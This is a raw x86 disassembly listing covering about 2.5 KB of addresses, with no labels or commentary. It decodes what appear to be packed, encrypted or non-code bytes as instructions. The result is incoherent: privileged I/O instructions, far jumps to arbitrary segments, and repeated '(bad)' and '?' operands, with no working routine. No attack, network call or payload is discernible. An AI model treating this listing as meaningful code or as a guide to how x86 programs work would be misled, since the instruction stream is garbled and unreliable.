  414e60:	retf   0x64ac
  414e63:	stc    
  414e64:	dec    esp
  414e65:	hlt    
  414e66:	clc    
  414e67:	js     0x414e79
  414e69:	xchg   BYTE PTR [edx-0x40d940ee],dl
  414e6f:	inc    ebp
  414e70:	iret   
  414e71:	sbb    DWORD PTR [ebp+0x4a6b50d1],esp
  414e77:	scas   al,BYTE PTR es:[edi]
  414e78:	cld    
  414e79:	sub    al,0xd5
  414e7b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  414e7d:	jecxz  0x414e36
  414e7f:	adc    BYTE PTR [esi+0x514fcdad],bl
  414e85:	ins    DWORD PTR es:[edi],dx
  414e86:	mov    ah,0xf7
  414e88:	inc    DWORD PTR [eax-0x68]
  414e8b:	push   ebx
  414e8c:	push   ss
  414e8d:	xchg   ecx,eax
  414e8e:	das    
  414e8f:	sahf   
  414e90:	std    
  414e91:	and    ah,BYTE PTR [ebx+0x7d]
  414e94:	outs   dx,BYTE PTR ds:[esi]
  414e95:	mov    WORD PTR [eax+0x41],ds
  414e98:	sub    eax,0x2ffd7249
  414e9d:	or     esp,DWORD PTR [ecx-0x17]
  414ea0:	sti    
  414ea1:	fs icebp 
  414ea3:	cld    
  414ea4:	xor    al,0xc2
  414ea6:	sbb    eax,0xa019d963
  414eab:	out    dx,al
  414eac:	cmp    al,0x41
  414eae:	cli    
  414eaf:	and    DWORD PTR [ebx-0x10],0xad1eb0d5
  414eb6:	inc    esi
  414eb7:	fnstsw WORD PTR [edx+esi*2+0x5a]
  414ebb:	adc    eax,0xfdbd82a4
  414ec0:	gs pop edx
  414ec2:	inc    eax
  414ec3:	inc    edx
  414ec4:	xor    DWORD PTR [esi+0x63f9e201],esi
  414eca:	push   esi
  414ecb:	ds sub eax,0x502bcd9f
  414ed1:	or     dh,BYTE PTR [ebx-0x54]
  414ed4:	push   ss
  414ed5:	dec    ecx
  414ed6:	(bad)  
  414ed8:	ror    DWORD PTR [edi],cl
  414eda:	test   al,0xa1
  414edc:	fsubr  st,st(0)
  414ede:	in     eax,dx
  414edf:	addr16 retf 
  414ee1:	jo     0x414e86
  414ee3:	addr16 ret 
  414ee5:	sub    al,0xc8
  414ee7:	jb     0x414f09
  414ee9:	retf   0xdb5b
  414eec:	out    dx,al
  414eed:	call   0xee67:0xaec1efa6
  414ef4:	imul   BYTE PTR [edi]
  414ef6:	pop    ebp
  414ef7:	adc    ebx,0x40
  414efa:	out    0xa4,eax
  414efc:	push   edi
  414efd:	dec    ebx
  414efe:	out    dx,eax
  414eff:	imul   esp,ebx,0xffffffa7
  414f02:	sub    DWORD PTR [esi-0x75fc5e54],ebp
  414f08:	fcom   st(3)
  414f0a:	loope  0x414e9f
  414f0c:	add    ch,ch
  414f0e:	fdiv   QWORD PTR [ebx]
  414f10:	pop    ebp
  414f11:	jle    0x414f3a
  414f13:	out    dx,eax
  414f14:	lods   al,BYTE PTR ds:[esi]
  414f15:	(bad)  
  414f16:	pop    esp
  414f17:	pop    esp
  414f18:	outs   dx,BYTE PTR ds:[esi]
  414f19:	mov    ch,0x72
  414f1b:	aad    0xee
  414f1d:	imul   ecx,DWORD PTR [ecx-0x7b],0xffffffdc
  414f21:	add    al,0x0
  414f23:	xlat   BYTE PTR ds:[ebx]
  414f24:	inc    ebx
  414f25:	mov    ah,0x20
  414f27:	push   ecx
  414f28:	inc    edx
  414f29:	ds shl esi,0xb6
  414f2d:	aaa    
  414f2e:	lahf   
  414f2f:	pop    ds
  414f30:	cmp    BYTE PTR [ebp+0x2],al
  414f33:	sar    DWORD PTR [edi+0x55],1
  414f36:	vpaddb ymm2,ymm4,YMMWORD PTR [ecx+edi*8+0x3c]
  414f3c:	inc    edx
  414f3d:	ss nop
  414f3f:	aam    0x99
  414f41:	or     BYTE PTR [eax+0x33],bh
  414f44:	(bad)  
  414f45:	mov    dh,0xd8
  414f47:	or     eax,0x4819034
  414f4c:	cmp    eax,0x78569033
  414f51:	fdivr  QWORD PTR [esi-0x3a]
  414f54:	fistp  WORD PTR [edx-0x46465540]
  414f5a:	sub    dl,BYTE PTR [ecx+0x20]
  414f5d:	sub    BYTE PTR [esi],ch
  414f5f:	ins    BYTE PTR es:[edi],dx
  414f60:	adc    eax,DWORD PTR [ecx+0x53093067]
  414f66:	lahf   
  414f67:	inc    esp
  414f68:	pop    es
  414f69:	dec    edx
  414f6a:	jmp    0x393ad554
  414f6f:	add    esi,esp
  414f71:	sub    BYTE PTR [esi+0x67b7cbaa],bl
  414f77:	sbb    cl,BYTE PTR [edi-0x55]
  414f7a:	loop   0x414f80
  414f7c:	rcr    DWORD PTR [ecx],cl
  414f7e:	mov    ah,0xbe
  414f80:	add    eax,DWORD PTR [edx]
  414f82:	gs scas al,BYTE PTR es:[edi]
  414f84:	call   0xac5e:0xbe190895
  414f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f8c:	add    bh,BYTE PTR [ebx-0x77cdf533]
  414f92:	sbb    BYTE PTR [ebp-0x573e95dd],ch
  414f98:	and    eax,DWORD PTR [ecx-0x21]
  414f9b:	adc    ch,bl
  414f9d:	push   cs
  414f9e:	xchg   ebx,eax
  414f9f:	mov    ds:0xd489d069,al
  414fa4:	inc    eax
  414fa5:	(bad)  
  414fa6:	iret   
  414fa7:	lahf   
  414fa8:	or     edi,edi
  414faa:	pop    edi
  414fab:	mov    ecx,0x41055c5d
  414fb0:	adc    esp,DWORD PTR ds:0x408fa197
  414fb6:	sbb    dl,BYTE PTR [eax]
  414fb8:	lea    esp,[edx]
  414fba:	jge    0x414fe6
  414fbc:	aaa    
  414fbd:	iret   
  414fbe:	inc    ebx
  414fbf:	jge    0x414fbf
  414fc1:	pop    eax
  414fc2:	(bad)  
  414fc3:	js     0x414f49
  414fc5:	dec    edi
  414fc6:	(bad)  
  414fc7:	pop    ss
  414fc8:	pop    esi
  414fc9:	push   esi
  414fca:	adc    BYTE PTR [eax-0x46],bh
  414fcd:	arpl   WORD PTR [esp+ecx*1],sp
  414fd0:	popa   
  414fd1:	add    al,BYTE PTR [ebx+esi*2]
  414fd4:	dec    edx
  414fd5:	sahf   
  414fd6:	cs add ebp,ebp
  414fd9:	(bad)  
  414fda:	sar    DWORD PTR [edi-0x5acc3b12],cl
  414fe0:	and    al,0xe9
  414fe2:	lods   al,BYTE PTR ds:[esi]
  414fe3:	mov    ah,0x3e
  414fe5:	jo     0x414f91
  414fe7:	mov    edi,0xf6d5256c
  414fec:	call   0xb380:0xcd1975dc
  414ff3:	push   edi
  414ff4:	sub    ch,BYTE PTR [ebx-0x44d01692]
  414ffa:	adc    bh,BYTE PTR [edx+0x5faddc9b]
  415000:	push   0x7c1727d7
  415005:	sbb    ecx,edx
  415007:	and    dl,BYTE PTR [edx+0x7b]
  41500a:	neg    BYTE PTR [esi]
  41500c:	popf   
  41500d:	dec    ebp
  41500e:	inc    ebx
  41500f:	mov    WORD PTR [edi+0x3df46a4a],ss
  415015:	cmp    al,0x7a
  415017:	and    dl,BYTE PTR [eax-0x38c61f52]
  41501d:	fimul  WORD PTR [ebp+0x25]
  415020:	jmp    0xa9e:0xed301b0b
  415027:	xchg   esp,eax
  415028:	xor    ch,dl
  41502a:	jl     0x414fc7
  41502c:	mov    ?,WORD PTR [esi+0xb]
  41502f:	lods   al,BYTE PTR ds:[esi]
  415030:	das    
  415031:	xlat   BYTE PTR ds:[ebx]
  415032:	sbb    al,bl
  415034:	jmp    0x39f2:0x1dceb5c3
  41503b:	mov    eax,DWORD PTR [edx]
  41503d:	hlt    
  41503e:	xor    dh,al
  415040:	call   0xa9e11e2
  415045:	push   esi
  415046:	dec    edi
  415047:	sti    
  415048:	or     BYTE PTR [eax],cl
  41504a:	in     eax,0xaa
  41504c:	ret    
  41504d:	in     al,dx
  41504e:	pop    esp
  41504f:	add    eax,0xe84d9b39
  415054:	xor    DWORD PTR [eax-0x4c854e2b],edi
  41505a:	sar    BYTE PTR [eax-0x19ac46bf],cl
  415060:	test   cl,0x2c
  415063:	leave  
  415064:	js     0x415004
  415066:	fisttp WORD PTR [esp+edi*2+0x29295da7]
  41506d:	aas    
  41506e:	push   esi
  41506f:	xor    al,0xef
  415071:	outs   dx,BYTE PTR ds:[esi]
  415072:	fisubr DWORD PTR [eax-0x1b]
  415075:	mov    edx,0x5bb86e5e
  41507a:	(bad)  
  41507b:	into   
  41507c:	cdq    
  41507d:	add    DWORD PTR [edx-0x706777b4],ebx
  415083:	outs   dx,BYTE PTR ds:[esi]
  415084:	leave  
  415085:	mov    dh,0xb8
  415087:	ror    BYTE PTR [esi+0x42],cl
  41508a:	bound  ecx,QWORD PTR [ebx]
  41508c:	xor    al,0xe8
  41508e:	test   BYTE PTR [edi],bh
  415090:	retw   
  415092:	mov    ch,0xdd
  415094:	pop    edi
  415095:	shl    DWORD PTR [edi+ebx*4+0xd],0xe1
  41509a:	pop    ss
  41509b:	repz test BYTE PTR [ebx+0x55],bh
  41509f:	(bad)  
  4150a0:	(bad)  [eax+edx*1-0x3e]
  4150a4:	or     ch,BYTE PTR [edx+0x4e293ee7]
  4150aa:	sti    
  4150ab:	mov    cl,0x83
  4150ad:	repz pushf 
  4150af:	rcr    BYTE PTR [ecx],cl
  4150b1:	sub    ch,BYTE PTR [esi-0x22]
  4150b4:	jl     0x4150cb
  4150b6:	mov    eax,0x5dffb4b4
  4150bb:	xor    eax,0xb7d7d4a6
  4150c0:	ror    DWORD PTR [edx],cl
  4150c2:	jbe    0x415105
  4150c4:	mov    eax,ds:0x7208440c
  4150c9:	repnz mov edi,0x478eaa36
  4150cf:	aam    0x38
  4150d1:	jne    0x415077
  4150d3:	xchg   ecx,eax
  4150d4:	xor    eax,0x15e73d01
  4150d9:	scas   eax,DWORD PTR es:[edi]
  4150da:	mov    edi,DWORD PTR [ebx]
  4150dc:	pusha  
  4150dd:	xchg   edx,eax
  4150de:	push   0xb31c8bea
  4150e3:	or     DWORD PTR [edi],edi
  4150e5:	sbb    esi,0x1eb7cb0a
  4150eb:	dec    ecx
  4150ec:	xchg   esi,eax
  4150ed:	jl     0x41511c
  4150ef:	xchg   DWORD PTR [edx],ebx
  4150f1:	test   eax,0xf9126e9d
  4150f6:	xchg   esi,eax
  4150f7:	call   0x3e44d842
  4150fc:	cmp    al,0xb8
  4150fe:	mov    es,WORD PTR [esi+ebx*2-0xb]
  415102:	outs   dx,DWORD PTR ds:[esi]
  415103:	mov    esp,0x3d80878d
  415108:	(bad)  
  415109:	retf   0xbdd9
  41510c:	jmp    0x6b7b789a
  415111:	call   0xd5c5:0xdd3a1dbb
  415118:	cli    
  415119:	shr    BYTE PTR [ecx-0x22fa398c],1
  41511f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415120:	mov    BYTE PTR [eax],bl
  415122:	std    
  415123:	out    0xcb,eax
  415125:	push   0xd1b044e3
  41512a:	push   ebx
  41512b:	gs cdq 
  41512d:	cmp    DWORD PTR [esi+0x49],edi
  415130:	pop    esi
  415131:	je     0x41510b
  415133:	inc    esp
  415134:	dec    eax
  415135:	imul   eax,DWORD PTR [ebx+0x61],0x6e2c19f9
  41513c:	pop    ebp
  41513d:	arpl   cx,bp
  41513f:	pop    ecx
  415140:	sbb    eax,0x667f3215
  415145:	test   esi,0x5dc231b0
  41514b:	in     al,0xd9
  41514d:	xor    ah,BYTE PTR [ecx+ebp*2-0x111fa7bc]
  415154:	or     bh,BYTE PTR [ebp-0x6cae6580]
  41515a:	xor    dh,BYTE PTR [esi+0x5a322889]
  415160:	fcmovbe st,st(1)
  415162:	push   0xffffffbc
  415164:	pop    ecx
  415165:	pushf  
  415166:	mov    edx,0xfe095e45
  41516b:	gs pop es
  41516d:	and    BYTE PTR [edx+0x1b],bh
  415170:	cmp    al,BYTE PTR [esi+ebp*2]
  415173:	test   DWORD PTR [edx-0x3637840d],ebx
  415179:	and    eax,0xc935c96
  41517e:	imul   edi,DWORD PTR [edx],0xbf736bc4
  415184:	mov    esi,0x85299100
  415189:	mov    al,ds:0xf634149f
  41518e:	xchg   ecx,eax
  41518f:	aam    0x9a
  415191:	inc    ecx
  415192:	test   dh,cl
  415194:	out    0xa1,eax
  415196:	push   edi
  415197:	cmc    
  415198:	inc    ebx
  415199:	mov    dl,ah
  41519b:	out    dx,al
  41519c:	imul   ebp,DWORD PTR [ecx-0x7119faf4],0xb3aedd3c
  4151a6:	fstp   DWORD PTR [ebx-0x10e030cc]
  4151ac:	xchg   esi,eax
  4151ad:	(bad)  
  4151ae:	repz sbb esi,DWORD PTR [eax]
  4151b1:	pop    ebx
  4151b2:	(bad)  
  4151b3:	mov    eax,ds:0x7cc956ab
  4151b8:	or     eax,0xe3ff7366
  4151bd:	xor    eax,0xb457ef68
  4151c2:	cmp    ch,BYTE PTR [esi+edx*8]
  4151c5:	dec    ecx
  4151c6:	cs into 
  4151c8:	cmp    eax,0xa9aa72f7
  4151cd:	addr16 gs repnz inc eax
  4151d1:	lock stos DWORD PTR es:[edi],eax
  4151d3:	jecxz  0x4151cf
  4151d5:	jae    0x4151ec
  4151d7:	frstor [edx+0x66]
  4151da:	jge    0x4151e3
  4151dc:	jae    0x415162
  4151de:	cmp    edx,DWORD PTR [edi-0x27]
  4151e1:	js     0x41521a
  4151e3:	setp   BYTE PTR [ebp+0x79d87638]
  4151ea:	leave  
  4151eb:	push   esi
  4151ec:	pushf  
  4151ed:	lea    esi,ds:0xa61a11b5
  4151f3:	or     esi,DWORD PTR fs:[ebx+0x7f]
  4151f7:	mov    ebx,0xec0b0f72
  4151fc:	adc    ebp,DWORD PTR [edx]
  4151fe:	mov    eax,ds:0x6eecb1e3
  415203:	in     al,dx
  415204:	push   0x38ad7766
  415209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41520a:	hlt    
  41520b:	aad    0x21
  41520d:	add    eax,0x491164ff
  415212:	sub    eax,0x7f77ed6c
  415217:	mov    esp,DWORD PTR [esi+0x4ade3928]
  41521d:	pop    eax
  41521e:	add    BYTE PTR [ebp-0x69],bl
  415221:	jle    0x415204
  415223:	sbb    ch,BYTE PTR [eax]
  415225:	out    0xe7,eax
  415227:	cdq    
  415228:	icebp  
  415229:	test   DWORD PTR [edi],0x66fc0567
  41522f:	loop   0x4152a6
  415231:	gs push edi
  415233:	pop    esi
  415234:	lea    ecx,[edi+0x6e]
  415237:	dec    eax
  415238:	imul   eax,DWORD PTR [edx-0x5ac20862],0x6e
  41523f:	inc    ebp
  415240:	es js  0x41528a
  415243:	push   es
  415244:	push   cs
  415245:	mov    WORD PTR [esi-0x1749614d],?
  41524b:	lods   eax,DWORD PTR ds:[esi]
  41524c:	pop    ss
  41524d:	pop    ss
  41524e:	xor    BYTE PTR [edi-0x5cc1e5c],ch
  415254:	and    DWORD PTR [ebx],edi
  415256:	push   ss
  415257:	jns    0x41529e
  415259:	inc    ecx
  41525a:	in     al,0x40
  41525c:	mov    dl,0x2f
  41525e:	mov    dl,0xa
  415260:	pop    ss
  415261:	outs   dx,BYTE PTR ds:[esi]
  415262:	scas   al,BYTE PTR es:[edi]
  415263:	popa   
  415264:	sahf   
  415265:	dec    esi
  415266:	mov    BYTE PTR [esi],dl
  415268:	test   DWORD PTR [edi],0x2cc6871e
  41526e:	mov    ds:0xedef8569,al
  415273:	addr16 inc eax
  415275:	or     ecx,DWORD PTR es:[ebp+eiz*1-0x3705fdb1]
  41527d:	cdq    
  41527e:	aaa    
  41527f:	push   ebp
  415280:	mov    esi,0x71f1c7fc
  415285:	xor    DWORD PTR [eax+0x6364f8e0],eax
  41528b:	cmp    al,0xb6
  41528d:	repnz iret 
  41528f:	pop    edx
  415290:	rol    DWORD PTR [ecx+0x22c35346],1
  415296:	fadd   DWORD PTR [ecx+0x3b]
  415299:	pop    edx
  41529a:	mov    ebx,0x6f52c562
  41529f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152a0:	data16 jle 0x4152ae
  4152a3:	push   ds
  4152a4:	xchg   esp,eax
  4152a5:	hlt    
  4152a6:	and    al,BYTE PTR [edi+edx*1-0x76]
  4152aa:	clc    
  4152ab:	rol    DWORD PTR [ecx+eax*8],0x2a
  4152af:	push   cs
  4152b0:	int3   
  4152b1:	mov    DWORD PTR [edi],edx
  4152b3:	dec    ebp
  4152b4:	jns    0x4152ae
  4152b6:	sti    
  4152b7:	xchg   ecx,eax
  4152b8:	mov    edx,0x1ad89a59
  4152bd:	aaa    
  4152be:	inc    ebp
  4152bf:	(bad)  
  4152c0:	mov    DWORD PTR [edx-0x17],ecx
  4152c3:	push   ss
  4152c4:	sbb    eax,0xde8cd37c
  4152c9:	jle    0x415333
  4152cb:	sbb    BYTE PTR [edi+eiz*2-0x22],0xcf
  4152d0:	sub    eax,0x3c401fa6
  4152d5:	jnp    0x4152eb
  4152d7:	pop    eax
  4152d8:	jns    0x4152c3
  4152da:	fst    st(1)
  4152dc:	and    al,0x91
  4152de:	jg     0x41530d
  4152e0:	or     edi,ebp
  4152e2:	clc    
  4152e3:	js     0x4152ad
  4152e5:	add    edx,DWORD PTR [eax]
  4152e7:	dec    esi
  4152e8:	out    dx,al
  4152e9:	(bad)  
  4152ea:	pushf  
  4152eb:	mov    al,ds:0x31839f30
  4152f0:	or     BYTE PTR [esi-0x2aee2aac],0x40
  4152f7:	fist   DWORD PTR [edi]
  4152f9:	mov    ah,0x13
  4152fb:	sbb    eax,0xbd60e315
  415300:	daa    
  415301:	inc    ebp
  415302:	cwde   
  415303:	adc    al,0xe1
  415305:	sbb    cl,bh
  415307:	dec    esp
  415308:	adc    BYTE PTR [ebx],0x83
  41530b:	push   esp
  41530c:	and    DWORD PTR [eax-0x8c49997],edi
  415312:	xor    bl,bl
  415314:	pop    ds
  415315:	std    
  415316:	test   ecx,ecx
  415318:	daa    
  415319:	sub    DWORD PTR [edi-0x78920402],ebp
  41531f:	and    eax,0xbf8be7a2
  415324:	test   BYTE PTR [ebp+0x4853ef9f],bh
  41532a:	icebp  
  41532b:	ud2    
  41532d:	sub    DWORD PTR [eax+0x67d5b20d],0xd049d064
  415337:	fidiv  DWORD PTR [ecx]
  415339:	jmp    0x1a46:0x19efb086
  415340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415341:	adc    bh,BYTE PTR ds:0x3360292
  415347:	ss stc 
  415349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41534a:	mov    dh,0xd3
  41534c:	mov    DWORD PTR [edi+eax*8],ebp
  41534f:	cs ret 0xb245
  415353:	jne    0x41538a
  415355:	inc    edx
  415356:	sbb    al,0xae
  415358:	push   eax
  415359:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41535a:	imul   ebx,DWORD PTR ds:0xee6b94a6,0x30da72d4
  415364:	das    
  415365:	mov    DWORD PTR [esi+0x35],esp
  415368:	cmp    ch,BYTE PTR [ecx-0x6cf326a3]
  41536e:	sti    
  41536f:	pop    ds
  415370:	enter  0x7152,0x25
  415374:	aas    
  415375:	mov    BYTE PTR [eax+eax*4],bh
  415378:	pop    ss
  415379:	mov    ds:0x440d02de,al
  41537e:	adc    eax,0x716cf72d
  415383:	inc    ecx
  415384:	and    al,0x1d
  415386:	mov    ch,0xd2
  415388:	add    edx,DWORD PTR [esi+0x31]
  41538b:	dec    eax
  41538c:	imul   esi,DWORD PTR [si-0x3ff],0x8c93686d
  415395:	push   ss
  415396:	cli    
  415397:	and    edi,DWORD PTR [esi+0x1d]
  41539a:	(bad)  
  41539b:	lock shl BYTE PTR [edx+0x5c978bd1],0x56
  4153a3:	push   esp
  4153a4:	fiadd  DWORD PTR [ebx+0x72475e79]
  4153aa:	pop    ebx
  4153ab:	mov    esp,0xfffa3648
  4153b0:	lock fisttp QWORD PTR [edx-0x614cb9c6]
  4153b7:	popf   
  4153b8:	in     eax,dx
  4153b9:	inc    esp
  4153ba:	mov    al,ds:0x4f2e4354
  4153bf:	fadd   st,st(0)
  4153c1:	fistp  WORD PTR [eax+ebp*2-0x6a]
  4153c5:	popa   
  4153c6:	mov    ebp,ds
  4153c8:	ins    DWORD PTR es:[edi],dx
  4153c9:	push   ds
  4153ca:	retf   
  4153cb:	iret   
  4153cc:	je     0x41538a
  4153ce:	in     eax,0xf0
  4153d0:	mov    bh,0x28
  4153d2:	lahf   
  4153d3:	sbb    ebp,DWORD PTR [eax+esi*1]
  4153d6:	sbb    al,0x27
  4153d8:	dec    esp
  4153d9:	gs push 0xffffffa6
  4153dc:	outs   dx,BYTE PTR ds:[esi]
  4153dd:	ret    
  4153de:	mov    eax,0x1a075482
  4153e3:	test   al,0xd4
  4153e5:	test   eax,ebx
  4153e7:	adc    BYTE PTR [ebp-0x4ab5050],ch
  4153ed:	bound  edx,QWORD PTR [ecx]
  4153ef:	pop    ecx
  4153f0:	fwait
  4153f1:	retf   
  4153f2:	nop
  4153f3:	pop    ss
  4153f4:	sahf   
  4153f5:	loop   0x415414
  4153f7:	mov    BYTE PTR [eax],dl
  4153f9:	push   ebp
  4153fa:	pop    ebp
  4153fb:	push   0xe8c60cfc
  415400:	lds    edx,FWORD PTR [ecx-0x5a]
  415403:	std    
  415404:	cmp    al,0x29
  415406:	mov    edi,0x653bfb98
  41540b:	ror    DWORD PTR [ecx+0x45],0x96
  41540f:	dec    eax
  415410:	dec    esi
  415412:	fs mov bl,0xda
  415415:	loopne 0x415431
  415417:	or     BYTE PTR [edi],ch
  415419:	loop   0x41539d
  41541b:	xchg   ecx,eax
  41541c:	or     BYTE PTR [ebx+edx*8],0x37
  415420:	xor    al,ch
  415422:	add    BYTE PTR [ebx-0x28],al
  415425:	iret   
  415426:	pusha  
  415427:	enter  0xb1f5,0x93
  41542b:	shl    BYTE PTR [ebp+0x44],0x6a
  41542f:	jmp    0xa3a496fc
  415434:	lods   al,BYTE PTR ds:[esi]
  415435:	or     bh,bl
  415437:	mov    eax,ds:0x6105b633
  41543c:	push   ds
  41543d:	jle    0x4154bb
  41543f:	pop    eax
  415440:	mov    edx,0x10580f33
  415445:	lods   al,BYTE PTR ds:[esi]
  415446:	icebp  
  415447:	or     eax,0xde81b522
  41544c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41544d:	mov    WORD PTR [ebx+0x68],?
  415450:	sti    
  415451:	or     eax,0xd329dfd8
  415456:	repz xchg ecx,eax
  415458:	sub    eax,0x926f3ed1
  41545d:	push   ss
  41545e:	daa    
  41545f:	dec    edi
  415460:	sahf   
  415461:	fisub  DWORD PTR [ecx+esi*2+0x1f]
  415465:	pop    ds
  415466:	adc    al,0xa
  415468:	xor    eax,0xb4395d19
  41546d:	retf   0xe4d3
  415470:	push   ebx
  415471:	and    DWORD PTR [eax+0x244a5dab],ebp
  415477:	fwait
  415478:	mov    al,0x68
  41547a:	push   edx
  41547b:	daa    
  41547c:	inc    esp
  41547d:	(bad)  
  41547e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41547f:	cmp    BYTE PTR [esi+0x74],cl
  415482:	int3   
  415483:	cwde   
  415484:	icebp  
  415485:	inc    esi
  415486:	or     ecx,DWORD PTR [edi-0x1a]
  415489:	jne    0x415451
  41548b:	clc    
  41548c:	fdiv   st,st(4)
  41548e:	pop    edi
  41548f:	jae    0x4154b2
  415491:	hlt    
  415492:	dec    esi
  415493:	shl    BYTE PTR [eax],cl
  415495:	inc    ebp
  415496:	cld    
  415497:	mov    WORD PTR [ebp+0x313b90d0],cs
  41549d:	shr    BYTE PTR [eax-0x52],cl
  4154a0:	or     edx,DWORD PTR [esi+0x7090bf79]
  4154a6:	cli    
  4154a7:	xchg   edi,eax
  4154a8:	imul   esp,DWORD PTR [ebx-0x7ef759a6],0x9b662107
  4154b2:	inc    esp
  4154b3:	pop    eax
  4154b4:	mov    al,ds:0x84ac8964
  4154b9:	test   al,cl
  4154bb:	test   al,0x5e
  4154bd:	inc    edi
  4154be:	sbb    esp,DWORD PTR [eax]
  4154c0:	mov    ds:0x796ee082,eax
  4154c5:	jge    0x4154ce
  4154c7:	cmp    BYTE PTR [edx],dl
  4154c9:	in     eax,0xb
  4154cb:	or     bl,BYTE PTR [ebp-0x57f75b81]
  4154d1:	enter  0x9ea9,0x46
  4154d5:	mov    ss,WORD PTR [edi+0x57]
  4154d8:	scas   eax,DWORD PTR es:[edi]
  4154d9:	in     eax,0x43
  4154db:	(bad)  
  4154dc:	ss fcmovbe st,st(1)
  4154df:	or     BYTE PTR [esp-0x3d4580a],0x65
  4154e7:	adc    BYTE PTR [ebx-0xb],bh
  4154ea:	jle    0x415500
  4154ec:	ror    DWORD PTR [edx+0x56],cl
  4154ef:	popa   
  4154f0:	enter  0x6ee1,0x19
  4154f4:	sub    esp,ebx
  4154f6:	leave  
  4154f7:	dec    ebx
  4154f8:	sbb    al,0x8
  4154fa:	shl    BYTE PTR [edx],cl
  4154fc:	fcomp  DWORD PTR [edi+0x4d]
  4154ff:	call   0xedcd2ed
  415504:	int    0x5c
  415506:	mov    ebp,DWORD PTR [ebp+eax*1+0x447a9e1f]
  41550d:	ja     0x4154c2
  41550f:	and    BYTE PTR [esi],dh
  415511:	xor    ah,bh
  415513:	dec    ecx
  415514:	iret   
  415515:	fwait
  415516:	add    DWORD PTR [esi],ecx
  415518:	sbb    bl,BYTE PTR [esi+ebp*8+0x606e4a20]
  41551f:	mul    BYTE PTR [eax]
  415521:	jno    0x41555e
  415523:	jp     0x415516
  415525:	cmp    ah,BYTE PTR [eax-0x7341b495]
  41552b:	adc    eax,0x9b627000
  415531:	jecxz  0x4154f9
  415533:	sbb    DWORD PTR [esi-0x223b9a97],edi
  415539:	pop    ecx
  41553a:	fmul   st(7),st
  41553c:	adc    DWORD PTR [ebx+0x68],edx
  41553f:	cmp    al,0x2c
  415541:	adc    BYTE PTR [edx+0x4c],bl
  415544:	xor    eax,0x6b50d18d
  415549:	fidiv  WORD PTR [ebx+esi*2+0x433a4a7c]
  415550:	dec    ebx
  415551:	inc    eax
  415552:	dec    esi
  415553:	bound  ebx,QWORD PTR ds:0x4efb663a
  415559:	xchg   DWORD PTR [eax],esi
  41555b:	out    0xd9,al
  41555d:	imul   ebp,DWORD PTR [edx+eax*4+0x34],0x64d22809
  415565:	xor    BYTE PTR [ebx],ch
  415567:	or     eax,0x7c4a45d5
  41556c:	ret    0xe247
  41556f:	stos   DWORD PTR es:[edi],eax
  415570:	shl    DWORD PTR [esi+0x5dfc431b],cl
  415576:	mov    WORD PTR [ebx],?
  415578:	and    al,0xe4
  41557a:	fild   DWORD PTR [edi-0x4ba228d0]
  415580:	push   0xffffffd1
  415582:	jae    0x41550c
  415584:	int    0x82
  415586:	xor    DWORD PTR [edx-0x269bd08d],eax
  41558c:	add    DWORD PTR [edx+0x71],0x87b7ea89
  415593:	mov    cl,0x96
  415595:	stc    
  415596:	dec    edi
  415597:	push   edx
  415598:	push   edx
  415599:	loope  0x415607
  41559b:	mov    eax,es
  41559d:	aam    0x21
  41559f:	scas   eax,DWORD PTR es:[edi]
  4155a0:	pop    ss
  4155a1:	dec    ecx
  4155a2:	dec    edi
  4155a3:	lock cdq 
  4155a5:	inc    ebp
  4155a6:	cmp    eax,0x8450dcfc
  4155ab:	sub    al,0xc6
  4155ad:	push   esp
  4155ae:	fstp   st(0)
  4155b0:	mov    esp,0x18548bca
  4155b5:	pop    esi
  4155b6:	int3   
  4155b7:	imul   eax,DWORD PTR [ebx],0xcd8684d1
  4155bd:	repnz mov edi,ebx
  4155c0:	push   ds
  4155c1:	jge    0x415553
  4155c3:	mov    fs,edi
  4155c5:	or     DWORD PTR [edi+0x792670ae],ebp
  4155cb:	lods   ax,WORD PTR ds:[esi]
  4155cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155ce:	clc    
  4155cf:	cmp    edx,DWORD PTR [esp+ebp*1+0x10]
  4155d3:	inc    esi
  4155d4:	push   cs
  4155d5:	jnp    0x415642
  4155d7:	mov    dh,0x65
  4155d9:	rol    DWORD PTR [ebp-0x25],0x13
  4155dd:	sbb    esi,edi
  4155df:	push   eax
  4155e0:	(bad)  
  4155e1:	push   edi
  4155e2:	mov    esp,0x5e7fa12b
  4155e7:	repz test DWORD PTR [ebx-0x6c88e51],ebp
  4155ee:	mov    eax,0x1ec7a7f7
  4155f3:	nop
  4155f4:	mov    ah,0x54
  4155f6:	jmp    0x22e687b8
  4155fb:	inc    esi
  4155fc:	inc    ecx
  4155fd:	dec    edi
  4155fe:	imul   esp,eax,0xffffff8b
  415601:	or     ebp,DWORD PTR [eax]
  415603:	mul    BYTE PTR [esi+0xf46aa5]
  415609:	push   edi
  41560a:	fwait
  41560b:	test   eax,0x344aecbd
  415610:	pop    ecx
  415611:	inc    esi
  415612:	fstp   st(3)
  415614:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415616:	icebp  
  415617:	lea    edx,[ebp+0x79edc675]
  41561d:	cdq    
  41561e:	(bad)
  415622:	inc    ebx
  415623:	mov    esi,0x21928030
  415628:	sub    eax,0x96615ed0
  41562d:	adc    al,0xdd
  41562f:	icebp  
  415630:	pushf  
  415631:	push   esp
  415632:	cmp    ch,BYTE PTR [ecx]
  415634:	lds    eax,FWORD PTR [edx]
  415636:	loope  0x41569e
  415638:	cmp    eax,0x98afce7
  41563d:	rsqrtss xmm7,DWORD PTR [ecx+0x10]
  415642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415643:	mov    ebp,0x1055b5ca
  415648:	addr16 (bad) 
  41564a:	test   eax,0xddd75160
  41564f:	inc    eax
  415650:	iret   
  415651:	lods   al,BYTE PTR ds:[esi]
  415652:	or     al,0x48
  415654:	in     eax,0x19
